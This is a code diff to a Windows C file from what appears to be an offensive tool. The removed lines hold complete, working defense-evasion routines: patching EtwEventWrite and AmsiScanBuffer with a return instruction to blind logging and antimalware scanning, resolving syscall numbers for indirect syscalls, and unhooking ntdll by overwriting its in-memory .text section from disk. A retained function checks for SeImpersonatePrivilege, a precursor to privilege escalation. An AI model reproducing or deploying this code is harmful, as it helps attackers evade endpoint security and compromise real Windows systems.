@@ -1,9 +1,12 @@
 #include <Windows.h>
 #include <stdarg.h>
 #include "util.h"
+
+// legacy globals kept so other TUs link
 DWORD g_ssn = 0;
 PVOID g_syscall = NULL;
 
+// ---- manual_procaddress: same as before, used for ntdll export walks ----
 PVOID manual_procaddress(HMODULE mod_handle, const char* funcName) {
     IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)mod_handle;
     IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)mod_handle + dos->e_lfanew);
@@ -54,176 +57,39 @@ PVOID manual_procaddress(HMODULE mod_handle, const char* funcName) {
     }
     return NULL;
 }
-DWORD getSSN(char* funcName) {
-    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
-        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return 0;
 
-    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
-    if (!hMap) { CloseHandle(hFile); return 0; }
-
-    PVOID pDisk = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
-    if (!pDisk) { CloseHandle(hMap); CloseHandle(hFile); return 0; }
-
-    PVOID fn = manual_procaddress((HMODULE)pDisk, funcName);
-    DWORD ssn = 0;
-    if (fn) ssn = *(DWORD*)((BYTE*)fn + 4);
-
-    UnmapViewOfFile(pDisk);
-    CloseHandle(hMap);
-    CloseHandle(hFile);
-    return ssn;
-}
-
-PVOID getSyscallAddr(char* funcName) {
-    HMODULE hMem = GetModuleHandleW(L"ntdll.dll");
-    PVOID fn = manual_procaddress(hMem, funcName);
-    if (!fn) return NULL;
-    BYTE* p = (BYTE*)fn;
-    for (int i = 0; i < 32; i++) {
-        if (p[i] == 0x0F && p[i + 1] == 0x05)
-            return (PVOID)&p[i];
-    }
-    return NULL;
-}
-
-
-BOOL EtwPatch() {
-    g_ssn = getSSN("NtProtectVirtualMemory");
-    g_syscall = getSyscallAddr("NtProtectVirtualMemory");
-
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-    if (!hNtdll) return 0;
-
-    PVOID pEtwAddr = manual_procaddress(hNtdll, "EtwEventWrite");
-    if (!pEtwAddr) return 0;
-
-    SIZE_T region = 1;
-    ULONG old = 0;
-    if (!iNtProtectVirtualMemory(GetCurrentProcess(), &pEtwAddr, &region, PAGE_EXECUTE_READWRITE, &old)) {
-        *(BYTE*)pEtwAddr = 0xC3;
-        iNtProtectVirtualMemory(GetCurrentProcess(), &pEtwAddr, &region, old, &old);
-        FlushInstructionCache(GetCurrentProcess(), pEtwAddr, 1);
-        printf("[x] ETW Patched!\n");
-        return 1;
-    }
-    return 0;
-}
-
-BOOL AmsiPatch() {
-    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
-    if (!hAmsi) {
-        printf("[x] AMSI not loaded\n");
-        return 1;  // silent skip
-    }
-    PVOID pAddr = manual_procaddress(hAmsi, "AmsiScanBuffer");
-    if (!pAddr) return 0;
-
-    DWORD old = 0;
-    if (iNtProtectVirtualMemory(GetCurrentProcess(), pAddr, 1, PAGE_EXECUTE_READWRITE, &old)) {
-        *(BYTE*)pAddr = 0xC3;
-        iNtProtectVirtualMemory(GetCurrentProcess(),pAddr, 1, old, &old);
-        FlushInstructionCache(GetCurrentProcess(), pAddr, 1);
-        printf("[x] AMSI Patched!\n");
-        return 1;
-    }
-    return 0;
-}
-
+// ---- check_seimpersonate: still works with WinAPI ----
 BOOL check_seimpersonate() {
-
-
-    TOKEN_PRIVILEGES* ptp = { 0 };
+    TOKEN_PRIVILEGES* ptp = NULL;
     DWORD dwLength = 0;
 
-    GetTokenInformation(
-        GetCurrentProcessToken(),
-        TokenPrivileges,
-        NULL,
-        0,
-        &dwLength
-    );
+    GetTokenInformation(GetCurrentProcessToken(), TokenPrivileges, NULL, 0, &dwLength);
+    if (dwLength == 0) {
+        printf("[-] ERROR: GetTokenInformation(size) failed %lu\n", GetLastError());
+        return 0;
+    }
 
-    ptp = (TOKEN_PRIVILEGES*)HeapAlloc(GetProcessHeap(),
-        HEAP_ZERO_MEMORY, dwLength);
+    ptp = (TOKEN_PRIVILEGES*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
+    if (!ptp) return 0;
 
-
-    if (GetTokenInformation(
-        GetCurrentProcessToken(),
-        TokenPrivileges,
-        ptp,
-        dwLength,
-        &dwLength
-    ))
-
-    {
+    BOOL ok = FALSE;
+    if (GetTokenInformation(GetCurrentProcessToken(), TokenPrivileges, ptp, dwLength, &dwLength)) {
         LUID seimpersonateLuid = { 0 };
         LookupPrivilegeValueA(NULL, "SeImpersonatePrivilege", &seimpersonateLuid);
         for (DWORD i = 0; i < ptp->PrivilegeCount; i++) {
             if (ptp->Privileges[i].Luid.LowPart == seimpersonateLuid.LowPart &&
                 ptp->Privileges[i].Luid.HighPart == seimpersonateLuid.HighPart) {
-                if (ptp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED || (ptp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)) {
+                if (ptp->Privileges[i].Attributes & (SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT)) {
                     printf("[x] SeImpersonatePrivilege\n");
-                    HeapFree(GetProcessHeap(), 0, ptp);
-                    return 1;
+                    ok = TRUE;
+                    break;
                 }
-
-
             }
         }
     }
-    printf("[-] ERROR: Missing SeImpersonatePrivilege!\n");
+    if (!ok) {
+        printf("[-] ERROR: Missing SeImpersonatePrivilege!\n");
+    }
     HeapFree(GetProcessHeap(), 0, ptp);
-    return 0;
-}
-
-BOOL unhook_Ntdll() {
-    g_ssn = getSSN("NtProtectVirtualMemory");
-    g_syscall = getSyscallAddr("NtProtectVirtualMemory");
-
-    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
-        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) { printf("[x] unhook_Ntdll: open file failed %lu\n", GetLastError()); return 0; }
-
-    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
-    if (!hMap) { printf("[x] unhook_Ntdll: CreateFileMapping failed %lu\n", GetLastError()); CloseHandle(hFile); return 0; }
-
-    PVOID pDisk = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
-    if (!pDisk) { printf("[x] unhook_Ntdll: MapViewOfFile failed %lu\n", GetLastError()); CloseHandle(hMap); CloseHandle(hFile); return 0; }
-
-    HMODULE hMem = GetModuleHandleW(L"ntdll.dll");
-    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hMem;
-    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)hMem + dos->e_lfanew);
-    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
-
-    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
-        if (RtlCompareMemory(sec->Name, ".text", 5) == 5) {
-            PVOID dst = (PVOID)((BYTE*)hMem + sec->VirtualAddress);
-            PVOID src = (PVOID)((BYTE*)pDisk + sec->PointerToRawData);
-            DWORD size = sec->SizeOfRawData;
-            PVOID base = dst;
-            SIZE_T sz = size;
-            DWORD old = 0;
-            __try {
-                NTSTATUS s = iNtProtectVirtualMemory(GetCurrentProcess(), &base, &sz, PAGE_EXECUTE_READWRITE, &old);
-                printf("[x] unhook_Ntdll: NtProtectVirtualMemory -> 0x%lX base=%p size=%lu\n", s, base, (unsigned long)sz);
-                if (!NT_SUCCESS(s)) { printf("[x] unhook_Ntdll: protect failed, abort\n"); break; }
-                RtlCopyMemory(dst, src, size);
-                FlushInstructionCache(GetCurrentProcess(), dst, size);
-                iNtProtectVirtualMemory(GetCurrentProcess(), &base, &sz, old, &old);
-            } __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_CONTINUE_SEARCH : EXCEPTION_EXECUTE_HANDLER) {
-                printf("[x] unhook_Ntdll: EXCEPTION in copy 0x%08lX\n", GetExceptionCode());
-            }
-            UnmapViewOfFile(pDisk);
-            CloseHandle(hMap);
-            CloseHandle(hFile);
-            printf("[x] Ntdll Unhooked!\n");
-            return 1;
-        }
-    }
-
-    UnmapViewOfFile(pDisk);
-    CloseHandle(hMap);
-    CloseHandle(hFile);
-    return 0;
+    return ok;
 }
